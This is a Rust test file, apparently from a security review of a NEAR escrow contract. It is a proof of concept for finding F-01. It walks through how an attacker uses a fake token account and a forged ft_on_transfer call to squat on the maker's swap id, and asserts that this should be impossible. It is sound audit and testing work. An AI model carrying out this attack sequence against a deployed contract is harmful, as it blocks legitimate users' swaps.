// Proof of concept for review-1 finding F-01 (swap id squatting through a fake token).
//
// Where it goes: append this whole file to the end of
// contracts/near-escrow/src/tests.rs. It uses that file's helpers (setup, ctx, at,
// at_with_deposit, open_with, terms, acc, maker, token, intents, ONE_NEAR, NOW, AMT).
// Run: cd contracts/near-escrow && cargo test --lib poc_f01
//
// It asserts the invariant and FAILS on the reviewed code: a third party, using any
// account as the "token", creates a swap under the maker's swap id, and the maker's own
// open with that salt is then refused. It passes once the fix in review-1.md is applied.

/// Runs one call as a transaction: if it panics, the contract storage and the in-memory
/// contract go back to their state before the call, as on chain. (The unit-test mock
/// keeps the writes of a call that panics; the existing tests note this.)
fn poc_tx<F: FnOnce(&mut Escrow)>(c: &mut Escrow, f: F) -> bool {
    use near_sdk::mock::with_mocked_blockchain;
    let snapshot = with_mocked_blockchain(|b| b.take_storage());
    let restore = |s: std::collections::HashMap<Vec<u8>, Vec<u8>>| {
        near_sdk::env::set_blockchain_interface(near_sdk::MockedBlockchain::new(
            ctx(&maker(), NOW).build(),
            near_sdk::test_vm_config(),
            RuntimeFeesConfig::test(),
            vec![],
            s,
            Default::default(),
            None,
        ));
    };
    restore(snapshot.clone());
    // The caller sets the context inside `f`; storage carries over through testing_env!.
    let ok = catch_unwind(AssertUnwindSafe(|| f(c))).is_ok();
    if !ok {
        with_mocked_blockchain(|b| drop(b.take_storage()));
        restore(snapshot);
        // A fresh view over the restored storage drops the maps' cached writes. Every
        // test in this file flushes its maps before a panic can matter, so the state
        // that `setup()` left is in storage (storage_funds is flushed below).
        *c = Escrow::new(intents());
    }
    ok
}

/// F-01: only the maker, through the real token, can create the swap at
/// `swap_id(maker, salt)`.
#[test]
fn poc_f01_third_party_cannot_take_the_makers_swap_id() {
    let mut c = setup();
    c.storage_funds.flush();
    let attacker = acc("attacker.near");
    let fake = acc("fake-token.near");
    let salt = [1u8; 32];
    let id = compute_swap_id(&maker(), &salt);

    // 1. The attacker deposits storage funds in the maker's name for the fake token.
    let funded = poc_tx(&mut c, |c| {
        at_with_deposit(&attacker, NOW, ONE_NEAR / 10);
        c.add_storage_funds(fake.clone(), Some(maker()));
        c.storage_funds.flush();
    });
    // 2. The fake token calls ft_on_transfer and names the maker as sender, with the
    //    salt it read from the maker's pending ft_transfer_call (`terms(1)`).
    let squatted = poc_tx(&mut c, |c| {
        at(&fake, NOW);
        c.ft_on_transfer(maker(), U128(1), terms(1).to_string());
        c.storage_funds.flush();
    });
    if let Some(v) = c.get_swap(Hex32(id)) {
        // On the reviewed code this branch runs: the maker's id now holds a swap in the
        // fake token that names the maker.
        assert_ne!(
            v.token,
            fake,
            "F-01: a third party (funded={funded}, squatted={squatted}) created swap {} \
             under the maker's id with token {}",
            hex::encode(id),
            v.token
        );
    }
    // 3. The maker's real open with the same salt must succeed.
    assert_eq!(open_with(&mut c, terms(1), AMT), U128(0));
    assert_eq!(c.get_swap(Hex32(id)).unwrap().token, token());
}
